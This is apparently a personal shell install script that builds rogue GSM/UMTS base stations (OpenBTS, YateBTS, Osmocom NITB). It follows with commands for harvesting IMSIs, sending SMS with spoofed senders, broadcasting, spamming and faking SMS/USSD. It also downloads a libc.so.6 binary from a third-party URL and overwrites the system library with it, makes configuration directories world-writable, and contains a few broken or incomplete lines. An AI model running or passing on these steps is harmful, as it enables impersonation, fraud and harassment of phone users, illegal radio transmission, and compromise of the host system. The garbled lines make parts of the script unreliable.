sudo apt-get install autoconf libtool libosip2-dev libortp-dev libusb-1.0-0-dev g++ sqlite3 libsqlite3-dev erlang libreadline6-dev libncurses5-dev git dpkg-dev debhelper libssl-dev cmake build-essential wget libzmq3-dev

mkdir OpenBTS
cd OpenBTS
git clone https://github.com/PentHertz/OpenBTS
cd OpenBTS/
git submodule init
git submodule init
git submodule update

# FOR UBUNTU 20.04 NOT NEED ON UBUNTU 22.04
gedit SIP/SIP2Interface.cpp 
# comment line 760 : ortp_set_log_handler((BctbxLogFunc) ortpLogFunc);

cd ..
zip -r OpenBTS.zip OpenBTS
mv OpenBTS.zip ../../Desktop/ltehack_backup 
cd OpenBTS


git clone https://github.com/PentHertz/libcoredumper.git
cd libcoredumper
# could error appeared but no problem
./build.sh
cd ..
zip -r libcoredumper.zip libcoredumper
mv libcoredumper.zip  ../../../Desktop/ltehack_backup 
cd libcoredumper/coredumper-1.2.1
./configure
make 
sudo make install
sudo ldconfig
cd  ../..


# Installing subscriberRegistry
git clone https://github.com/PentHertz/subscriberRegistry.git
cd subscriberRegistry
git submodule init
git submodule update
cd ..
zip -r subscriberRegistry.zip subscriberRegistry
mv subscriberRegistry.zip ../../../Desktop/ltehack_backup 
cd subscriberRegistry
./autogen.sh
./configure
make 
sudo make install
sudo ldconfig
cd ../


# Installing liba53
git clone https://github.com/PentHertz/liba53.git
zip -r liba53.zip liba53 
mv liba53.zip ../../../Desktop/ltehack_backup 
cd liba53
make 
sudo make install
sudo ldconfig
cd ..


# Installing smqueue
git clone https://github.com/PentHertz/smqueue.git
cd smqueue
git submodule init
git submodule update
cd ..
zip -r smqueue.zip smqueue
mv smqueue.zip ../../../Desktop/ltehack_backup 

cd smqueue
./autogen.sh
./configure
make 
sudo make install
sudo ldconfig
cd ../


# Making rooms for subscriberRegistry and smqueue

sudo sqlite3 -init ./apps/OpenBTS.example.sql /etc/OpenBTS/OpenBTS.db ".quit"

sudo mkdir -p /var/lib/asterisk/sqlite3dir
sudo sqlite3 -init /etc/OpenBTS/sipauthserve.example.sql /etc/OpenBTS/sipauthserve.db ".quit"
sudo mkdir /var/lib/OpenBTS
sudo touch /var/lib/OpenBTS/smq.cdr

# Installing OpenBTS
./autogen.sh
./configure --with-uhd
make
make install

# Fuzzing testing : https://github.com/PentHertz/OpenBTS/
# git checkout fuzzing-dev


cd ..

# /*
# https://github.com/PentHertz/OpenBTS-UMTS/blob/master/install_dependences.sh
# Install all package dependencies
# Do not install libuhd-dev uhd-host
# */

sudo apt-get install autoconf libtool build-essential  libzmq3-dev libosip2-dev libortp-dev libusb-1.0-0-dev asn1c libtool-bin libsqlite3-dev libreadline-dev


git clone https://github.com/PentHertz/OpenBTS-UMTS
cd OpenBTS-UMTS

# Clone submodules from base repo
git submodule init
git submodule update

# Uncompress, configure, compile and install 
# bundled version of ASN1 compiler, necessary in build-time

cd ..
zip -r OpenBTS-UMTS.zip OpenBTS-UMTS
mv OpenBTS-UMTS.zip ../../Desktop/ltehack_backup 

cd OpenBTS-UMTS
tar -xvzf asn1c-0.9.23.tar.gz
cd ./vlm-asn1c-0959ffb/
./configure
make
sudo make install
cd ../


# https://github.com/PentHertz/OpenBTS-UMTS/wiki

./autogen.sh
./configure
make
sudo make install
cd ..



cd ..

######################################################################
#                         INSTALLING YATE BTS 
######################################################################

# /*
# trick nipc follow this one ; https://nickvsnetworking.com/compiling-yatebts-nipc-for-software-defined-gsm-gprs/
# https://nickvsnetworking.com/installing-yate-from-source-on-ubuntu-20-04/
# https://hernan.de/blog/creating-a-cellular-testbed-with-yatebts-and-srslte/
# trick apache : https://askubuntu.com/questions/256013/apache-error-could-not-reliably-determine-the-servers-fully-qualified-domain-n
# trick qsound compilation problem : https://gist.github.com/MayamaTakeshi/64c2893dfbddb8729fcbe70b9a0b2e74
# */

mkdir yate
cd yate

apt-get install subversion autoconf build-essential

sudo apt-get install python3-six python3-mako python3-lxml python3-lxml python3-numpy python3-numpy python3-pip git python3-pybind11 libsndfile1-dev autoconf libgsm1-dev libgusb-dev build-essential libssl-dev  libboost-all-dev  git libncurses5-dev libtecla1 libtecla-dev pkg-config git wget git telnet apache2 libusb-1.0-0  libusb-1.0-0-dev libgsm1 libgsm1-dev cmake automake  php

#sudo apt-get install php5.6 apache2
apt-get install apache2 php

# For not having qsound problem on compilation

sudo add-apt-repository ppa:rock-core/qt4
sudo apt update
sudo apt-get install qt4-dev-tools
rm -rf /usr/local/share/yate/


#wget https://nuand.com/downloads/yate-rc-3.tar.gz
wget https://nuand.com/downloads/yate-rc-2.tar.gz

#tar -xvf yate-rc-3.tar.gz
tar -xvf yate-rc-2.tar.gz

#mv yate-rc-3.tar.gz ../../Desktop/ltehack_backup 
mv yate-rc-2.tar.gz ../../Desktop/ltehack_backup 

cd yate
./autogen.sh
./configure --prefix=/usr/local
make
make install-noapi
ldconfig

cd ../yatebts/ 
./autogen.sh 
./configure --prefix=/usr/local
make
make install
ldconfig
cd ..

# installing nipc
# cd /usr/src/yatebts/nipc

rm -rf /var/www/html/nipc
ln -s /usr/local/share/yate/nipc_web /var/www/html/nipc

#chmod a+rw /usr/local/etc/yate/
sudo chmod -R a+rw /usr/local/etc/yate

#chown root:root /usr/local/etc/yate/*.conf
chmod -R a+rw /usr/local/etc/yate/*.conf

# RQ : HAVE ON LOOK ON tmsidata.conf for DOING SPOOFING

sudo touch /usr/local/etc/yate/snmp_data.conf /usr/local/etc/yate/tmsidata.conf

mv ../../Desktop/ltehack_backup 


cd ..


#####################################################################
#                      INSTALLING NITB
#####################################################################
# FAKE_SMS_SENDER AS DRAGON ON UBUNTU
# MODIF UHD 4.1.0.5
# MODIF OSMO-IUH FACULTATIF
# MODIF OSMO-GGSN 1.9.0 ->ok
# MODIF OSMO-SIP-CONNECTOR 1.3.1
# MODIF OSMO-TRX-UHD ---> 1.4.1.7-f2f3
# MODIF OSMO-BTS 1.2.2
# MODIF OSMO-PCU 1.1.0
# PAS DE OSMO-HLR
# MODIF OSMO-SGSN 1.6.2
# MODIF OSMO-NITB + OPENBSC 1.4.1.1-7baef


sudo apt-get install build-essential gcc g++ make automake autoconf libtool pkg-config libtalloc-dev libpcsclite-dev libortp-dev libsctp-dev libssl-dev libdbi-dev libdbd-sqlite3 libsqlite3-dev libpcap-dev libc-ares-dev libgnutls28-dev libsctp-dev sqlite3 libsofia-sip-ua-glib-dev libusb-1.0-0-dev libfftw3-dev libgsm1-dev

sudo apt-get install autoconf automake build-essential ccache cmake cpufrequtils doxygen ethtool g++ git inetutils-tools libboost-all-dev libncurses5 libncurses5-dev libusb-1.0-0 libusb-1.0-0-dev libusb-dev python3-dev python3-mako python3-numpy python3-requests python3-scipy python3-setuptools python3-ruamel.yaml

sudo apt install asterisk telnet python3-pip

sudo pip3 install smpplib


apt-get install libmnl-dev

mkdir nitb
cd nitb


git clone --depth 1 -b 1.7.0 https://gitea.osmocom.org/osmocom/libosmocore
libosmocore

zip -r libosmocore.zip libosmocore
mv libosmocore.zip ../../Desktop/ltehack_backup/
cd libosmocore
autoreconf -fi
./configure
make
make check
sudo make install
sudo ldconfig
cd ..


git clone --depth 1 -b 0.6.0 https://gitea.osmocom.org/osmocom/libosmo-abis

zip -r libosmo-abis.zip libosmo-abis
mv libosmo-abis.zip ../../Desktop/ltehack_backup/
cd libosmo-abis
autoreconf -fi
./configure
make 
make check
sudo make install
sudo ldconfig
cd ..
# 2/2


git clone --depth 1 -b 0.4.0 https://gitea.osmocom.org/osmocom/libosmo-netif

zip -r libosmo-netif.zip libosmo-netif
mv libosmo-netif.zip ../../Desktop/ltehack_backup/
cd libosmo-netif
autoreconf -fi
./configure
make 
make check
sudo make install
sudo ldconfig
cd ..
# 3/3


git clone --depth 1 -b 1.0.0 https://gitea.osmocom.org/osmocom/libosmo-sccp

zip -r libosmo-sccp.zip libosmo-sccp
mv libosmo-sccp.zip ../../Desktop/ltehack_backup/
cd libosmo-sccp
autoreconf -fi
./configure
make 
make check
sudo make install
sudo ldconfig
cd ..
# 5/5



git clone --depth 1 -b 0.9.31 https://gitea.osmocom.org/cellular-infrastructure/libasn1c

zip -r libasn1c.zip libasn1c
mv libasn1c.zip ../../Desktop/ltehack_backup/
cd libasn1c
autoreconf -fi
./configure
make 
make check
sudo make install
sudo ldconfig
cd ..
#



git clone --depth 1 -b 1.13.0 https://gitea.osmocom.org/cellular-infrastructure/libsmpp34

zip -r libsmpp34.zip libsmpp34
mv libsmpp34.zip ../../Desktop/ltehack_backup/
cd libsmpp34
autoreconf -fi
./configure
make -j4
make check
sudo make install
sudo ldconfig
cd ..
#


git clone --depth 1 -b 0.4.0 https://gitea.osmocom.org/cellular-infrastructure/osmo-iuh

zip -r osmo-iuh.zip osmo-iuh
mv osmo-iuh.zip ../../Desktop/ltehack_backup/
cd osmo-iuh
autoreconf -fi
./configure
make	
make check
sudo make install
sudo ldconfig
cd ..
# 3/3



#Linux kernel no GTP
git clone --depth 1 -b 1.9.0 https://gitea.osmocom.org/cellular-infrastructure/osmo-ggsn

zip -r osmo-ggsn.zip osmo-ggsn
mv osmo-ggsn.zip ../../Desktop/ltehack_backup/
cd osmo-ggsn
autoreconf -fi
./configure
make -j4
make check
sudo make install
sudo ldconfig
cd ..
# 5/5


git clone --depth 1 -b 1.3.1 https://gitea.osmocom.org/cellular-infrastructure/osmo-sip-connector

zip -r osmo-sip-connector.zip osmo-sip-connector
mv osmo-sip-connector.zip ../../Desktop/ltehack_backup/
cd osmo-sip-connector
autoreconf -fi
./configure
make 
make check
sudo make install
sudo ldconfig
cd ..
#


git clone --depth 1 -b 1.4.1 https://gitea.osmocom.org/cellular-infrastructure/osmo-trx

zip -r osmo-trx.zip osmo-trx
mv osmo-trx.zip ../../Desktop/ltehack_backup/
cd osmo-trx
autoreconf -fi
./configure --with-uhd
make 
make check
sudo make install
sudo ldconfig
cd ..
# 7/7 --->osmo-trx ok


git clone --depth 1 -b  1.2.2 https://gitea.osmocom.org/cellular-infrastructure/osmo-bts

zip -r osmo-bts.zip osmo-bts
mv osmo-bts.zip ../../Desktop/ltehack_backup/
cd osmo-bts
autoreconf -fi
./configure --enable-trx
make 
make check
sudo make install
sudo ldconfig
cd ..
# 8/8



git clone --depth 1 -b 1.1.0 https://gitea.osmocom.org/cellular-infrastructure/osmo-pcu

zip -r osmo-pcu.zip osmo-pcu
mv osmo-pcu.zip ../../Desktop/ltehack_backup/
cd osmo-pcu
autoreconf -fi
./configure
make
make check
sudo make install
sudo ldconfig
cd ..
# 12/12

git clone --depth 1 -b 1.4.1 https://gitea.osmocom.org/cellular-infrastructure/openbsc

zip -r openbsc.zip openbsc
mv openbsc.zip ../../Desktop/ltehack_backup/
cd openbsc/openbsc
autoreconf -fi
./configure --enable-mgcp-transcoding --enable-nat --enable-smpp --enable-osmo-bsc
make 
make check
sudo make install
sudo ldconfig
cd ../..
# 15/15


git clone --depth 1 -b 1.0.0 https://gitea.osmocom.org/cellular-infrastructure/osmo-hlr

zip -r osmo-hlr.zip osmo-hlr
mv osmo-hlr.zip ../../Desktop/ltehack_backup/

cd osmo-hlr
autoreconf -fi
./configure
make -j4
make check
sudo make install
sudo ldconfig
cd ..
# 5/5



git clone --depth 1 -b 1.6.2 https://gitea.osmocom.org/cellular-infrastructure/osmo-sgsn

zip -r osmo-sgsn.zip osmo-sgsn
mv osmo-sgsn.zip ../../Desktop/ltehack_backup/
cd osmo-sgsn
autoreconf -fi
./configure
make 
make check
sudo make install
sudo ldconfig
cd ..
# 8/8

wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip

unzip osmo-nitb-scripts.zip




cd osmo-nitb-scripts
bash install_services.sh  

mkdir /var/lib/osmocom
touch /var/lib/osmocom/hlr.sqlite3

# TESTING SPOOFING WITH PHONE
#terminal 1
python3 src/nitb/osmo-nitb-scripts/main_uhd_spoof.py --sip

#terminal 2
osmo-trx-uhd -C src/nitb/osmo-nitb-scripts/configs/osmo-trx-uhd.cfg

#terminal 3
#Finding imsi and extension
bash src/nitb/osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh 

# associate imsi and extension
bash src/nitb/osmo-nitb-scripts/scripts_spoof1/set_imsi_extension.sh "imsi" "extension"

# for verification use finding imsi and extension
bash src/nitb/osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh 


#sending broadcast sms / change number of sender (numero_emetteur) 
# Change also the message: 
gedit src/nitb/osmo-nitb-scripts/scripts_spoof1/sending_sms_broadcast.py 


python2 src/nitb/osmo-nitb-scripts/scripts_spoof1/sending_sms_broadcast.py 



#sending sms 
#change number of sender : numero_emetteur
#change also number of arrival : numero_destinataire
#change also the message

gedit src/nitb/osmo-nitb-scripts/scripts_spoof1/sending_sms_spoof_byextension.py

python2 src/nitb/osmo-nitb-scripts/scripts_spoof1/sending_sms_spoof_byextension.py


#use with precaution for deleting  all users : 
bash src/nitb/osmo-nitb-scripts/scripts_spoof1/delete_all.sh 


# TESTING SPOOFING WITHOUT PHONE
#terminal 1
python3 src/nitb/osmo-nitb-scripts/main_uhd_spoof.py --sip

#terminal 2
osmo-trx-uhd -C src/nitb/osmo-nitb-scripts/configs/osmo-trx-uhd.cfg

#terminal 3
#Finding imsi and extension
python2 src/nitb/osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 

# sending msg as a source on destination 
# program runs even source not in database
python2 src/nitb/osmo-nitb-scripts/scripts_spoof2/sms_send_source_dest_msg.py  "source" "dest" "msg"

# sending msg as a source on broad 
# program runs even source not in database
python2 src/nitb/osmo-nitb-scripts/scripts_spoof2/sms_broadcast.py "source" "msg"

# sending msg spam with random number
src/nitb/osmo-nitb-scripts/scripts_spoof2/sms_spam.py "extension_destination" "repeats" "msg"




# TESTING FAKE SMS/USSD SENDER

#terminal 1
python3 src/nitb/osmo-nitb-scripts/main_uhd.py --sip

#terminal 2
osmo-trx-uhd -C src/nitb/osmo-nitb-scripts/configs/osmo-trx-uhd.cfg

#terminal 3
#have a look on interact + change the option on ID -e
gedit src/nitb/osmo-nitb-scripts/config.json 

python3 src/nitb/osmo-nitb-scripts/interact.py -c src/nitb/osmo-nitb-scripts/config.json -D /var/lib/osmocom/hlr.sqlite3 -e 136




#####################################################################
#                      INSTALLING CALYPSO-BTS AS KARLY
#####################################################################
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/CalypsoBTS.zip


cp -rf CalypsoBTS /usr/src/


wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/libosmocore.so.18

cp libosmocore.so.18 /usr/lib/x86_64-linux-gnu/

wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/libc.so.6

cp libc.so.6 /usr/lib/x86_64-linux-gnu/

osmo-nitb-scripts-calypsobts.zip

